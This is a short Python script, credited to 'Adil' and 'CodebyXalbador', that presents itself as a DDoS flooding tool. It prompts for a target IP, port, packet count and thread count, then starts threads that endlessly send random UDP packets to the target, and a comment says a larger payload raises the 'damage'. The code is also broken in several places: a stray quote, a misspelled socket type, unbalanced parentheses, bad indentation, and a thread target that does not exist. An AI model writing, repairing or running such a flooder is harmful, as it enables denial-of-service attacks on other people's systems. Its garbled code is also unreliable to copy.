#Adil
#CodebyXalbador
import socket
import random
import threading
import os,sys

 print("Welcom DDOS")
 
 ip_Adil = str(input("ip target : "))
 port_Adil = int(input("port target" : "))
 paket_Adil = int(input("paket dari Ddos :"))
 threads_Adil = int(input("thread dari Ddos : "))
 os.system("clear")
 
 def wibu():
     asu = random._urandom(1024)#ubah angka urandom= damge
     while True:
         try:
             s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
             s.connect((ip_Adil)),port_Adil))
             s.sendto(asu)
             for x in range (paket_Adil):
                 s.sendto(asu)
              print("[•]DDOS Attack!!")
          except :
              print("[•]DDOS Attack!!")

 for y in range(threads_Adil):
     th = threading.Thread(target=Adil)
     th.start()